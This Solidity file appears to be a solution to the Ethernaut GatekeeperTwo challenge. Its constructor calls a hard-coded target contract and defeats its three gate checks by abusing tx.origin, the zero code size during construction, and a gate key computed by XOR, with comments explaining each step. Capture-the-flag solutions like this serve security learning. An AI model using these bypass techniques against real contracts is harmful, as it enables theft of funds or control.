// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import {GatekeeperTwo} from "./GatekeeperTwo.sol";
contract AttackGateKeeperTwo {
    GatekeeperTwo gTwo = GatekeeperTwo(0x1e600DeB41a8ccCcb657C8cC0f3cf01d4b2FC160);
    event GateTwoCompromised(address who, uint256 timestamp);
    /**
    * modifierOne will be passed as tx.origin = EOA and msg.sender = address(this)
    * modifierTwo will be passed as during contract construction the extcodesize is 0
    *               Reference from YellowPaper: During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account.
    * modifirerThree do calculation inside the constructor and pass it as gateKey
    */
    constructor() public {
        // GatekeeperTwo's enter function must be called from here
        // Since a ^ b = c implies a ^c = b. In our case `b` is `gateKey`
        bytes8 gateKey = bytes8((uint64(0) - 1)) ^ bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        gTwo.enter(gateKey);
        emit GateTwoCompromised(address(this), block.timestamp);


    }
}